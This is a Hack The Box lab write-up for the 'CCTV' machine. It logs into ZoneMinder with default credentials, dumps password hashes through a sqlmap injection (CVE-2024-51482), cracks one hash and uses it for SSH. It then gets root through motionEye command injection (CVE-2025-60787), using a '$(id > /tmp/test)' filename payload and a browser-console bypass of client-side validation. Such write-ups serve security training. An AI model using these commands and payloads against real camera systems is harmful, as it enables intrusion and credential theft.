---
title: "HTB - CCTV (Season 10)"
date: 2026-03-11
hide_post_tail: true
---

## 0. Discovery and Enumeration

I started with my usual sequence of connectivity checks and `nmap` scans to see what was open and running.

### Quick Scan

```bash
sudo nmap -T4 -sC -sV -O <TARGET_IP>
```

### UDP Scan

```bash
sudo nmap -sU --top-ports 50 <TARGET_IP>
```

### Full TCP Scan

```bash
sudo nmap -Pn -T4 -p- <TARGET_IP>
```

### Full Service Scan

```bash
sudo nmap -Pn -sC -sV -O -p 22,80 <TARGET_IP>
```

This sequence identified two open services: SSH and HTTP.

```text
PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|_  256 76:1d:73:98:fa:05:f7:0b:04:c2:3b:c4:7d:e6:db:4a (ECDSA)

80/tcp open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://cctv.htb/
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port

Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X

OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3

OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
```

## 1. Initial Access

### 1.1 Site Exploration

From there, I configured local host resolution and browsed to the target URL.

![cctv.htb Landing Page](/assets/img/writeups/htb-cctv-season-10/cctv.htb_landing.png)

The landing page only presented two real interaction points:

1. The **Get a Quote** button at the bottom of the page. Clicking it opened an email client with a prefilled target address. I left that alone for the moment, since it seemed unlikely to trigger unexpected behavior in the application itself.
2. The **Staff Login** button in the top-right corner. Clicking that led to a login page.

![ZoneMinder Login](/assets/img/writeups/htb-cctv-season-10/zm_login.png)

I then ran some basic page enumeration with `ffuf` to look for other publicly routable paths. The results were sparse, and direct browser access to the findings mostly returned authentication errors.

```bash
ffuf -u http://cctv.htb:80/FUZZ -w /usr/share/wordlists/dirb/common.txt -t 10 -rate 20 -fs 0
```

```text
ffuf -u http://cctv.htb:80/FUZZ -w /usr/share/wordlists/dirb/common.txt -t 10 -rate 20 -fs 0

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cctv.htb:80/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 10
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

                        [Status: 200, Size: 6177, Words: 1643, Lines: 225, Duration: 95ms]
.hta                    [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 104ms]
.htaccess               [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 96ms]
.htpasswd               [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 96ms]
cgi-bin/                [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 101ms]
index.html              [Status: 200, Size: 6177, Words: 1643, Lines: 225, Duration: 100ms]
javascript              [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 95ms]
server-status           [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 95ms]
:: Progress: [4614/4614] :: Job [1/1] :: 20 req/sec :: Duration: [0:03:55] :: Errors: 0 ::
```

Because the output was so limited, I tried default admin credentials on the login page. Lo and behold, they worked and gave access to the ZoneMinder console.

```text
username: admin
password: admin
```

![ZoneMinder Console](/assets/img/writeups/htb-cctv-season-10/zm_console.png)

### 1.2 Vulnerability Identification: SQL Injection

The console exposed a lot of options and inputs, so instead of probing blindly, I checked for known issues in this ZoneMinder version (`v1.37.63`). I found repeated references to a SQL injection vulnerability tracked as **CVE-2024-51482**.

The CVE noted that exploitation required an authenticated user. Since default admin credentials were still valid, that requirement was already met.

### 1.3 Exploiting the SQL Injection Vulnerability

First, I captured the authenticated session cookie from the `admin/admin` session so I could reuse it in `sqlmap`.

After some syntax tuning, I used the following command to test whether I could enumerate databases:

```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
    --cookie="ZMSESSID=<COOKIE>" \
    -p tid --dbms=mysql --batch --dbs
```

```text
available databases [3]:
[*] information_schema
[*] performance_schema
[*] zm
```

That confirmed `sqlmap` could exploit the injection point. Next, I dumped users:

```text
Database: zm
Table: Users
[3 entries]
+------------+
| Username   |
+------------+
| admin      |
| mark       |
| superadmin |
+------------+
```

Since I already had the basic `admin` account, I focused on password hashes for `mark` and `superadmin`:

```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
    --cookie="ZMSESSID=<COOKIE>" \
    -p tid --dbms=mysql --batch -D zm -T Users -C "Password" --where="Username='<USER>'" --dump
```

This returned two hashes to crack:

```text
mark: $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.
superadmin: $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm
```

`john` quickly cracked the `mark` user password:

```text
username: mark
password: opensesame
```

### 1.4 SSH Access

I then tried SSH with those credentials, and access succeeded.

![SSH Access - Mark](/assets/img/writeups/htb-cctv-season-10/ssh_mark.png)

At that point I expected to find a user flag, but nothing obvious was in the home directory, so I moved on to broader local exploration.

![Mark Home Directory](/assets/img/writeups/htb-cctv-season-10/mark_home.png)

## 2. On-Target Exploration

### 2.1 Configuration Information

I was not very familiar with ZoneMinder internals, so I started by checking what related services were configured on the target.

I reviewed `/etc/` for anything camera-related; most entries looked standard, but `motion` and `motioneye` stood out.

After exploring those directories further, I found camera and service configuration files. The two key files were under `motioneye`.

1. `motioneye.conf` showed that the motionEye service was listening on a local port.

![motionEye Service Listener](/assets/img/writeups/htb-cctv-season-10/motioneye_listen.png)

2. `motion.conf` contained plaintext admin credentials in a commented field.

![motionEye Admin Credentials](/assets/img/writeups/htb-cctv-season-10/motioneye_admin_creds.png)

### 2.2 Access to motionEye

From there, I wanted to reach the local-only motionEye service, so I created an SSH tunnel through the existing `mark` session.

```bash
ssh -L 8765:127.0.0.1:8765 mark@cctv.htb
```

Browsing to the forwarded port brought up a login page.

![motionEye Login](/assets/img/writeups/htb-cctv-season-10/motioneye_login.png)

Using the credentials from the config file, I reached the motionEye management console with a single video feed.

![motionEye Console](/assets/img/writeups/htb-cctv-season-10/motioneye_console.png)

### 2.3 Vulnerability Identification: Remote Code Execution

Again, there were a lot of fields and options, so I switched back to research mode.

I found multiple write-ups describing command injection through the `image_file_name` field referenced as **CVE-2025-60787**.

Looking at the console, I identified that exact field:

![motionEye Image File Name](/assets/img/writeups/htb-cctv-season-10/motioneye_image_file.png)

It appeared to be a normal date-time format field, but the CVE documentation indicated the value could be prepended with command syntax that was not properly sanitized.

### 2.4 Exploiting the Command Injection Vulnerability

To validate this, I prepended a simple command before the date-time pattern:

```text
$(id > /tmp/test)%Y-%m-%d-%H-%M-%S
```

Saving the setting failed in the UI:

![Apply Setting Failure](/assets/img/writeups/htb-cctv-season-10/config_fail.png)

Based on the earlier research, that behavior was expected.

The web UI (not the application itself) tried to block shell-like syntax via a JavaScript function named `configUiValid`.

I bypassed that client-side check in the browser console by forcing the function to always return `true`:

```text
configUiValid = function() { return true; };
```

After that, saving succeeded.

I then triggered still-image capture from the available camera feed, checked the target file from SSH, and confirmed the command injection worked.

![Successful Command Injection](/assets/img/writeups/htb-cctv-season-10/command_poc.png)

## 3. System Compromise / Flag Retrieval

With command execution confirmed, I submitted a simple reverse shell using the same method and landed a root shell. I navigated to the `root` home directory and retrieved the root flag.

![Root Shell & Flag](/assets/img/writeups/htb-cctv-season-10/root_shell.png)

At that privilege level, I also assumed I could retrieve the user flag.

I was still waiting on the superuser password crack, but it was no longer necessary.

I moved to the `sa_mark` user directory, found the user flag, and captured it as well.

![User Flag](/assets/img/writeups/htb-cctv-season-10/user_flag.png)
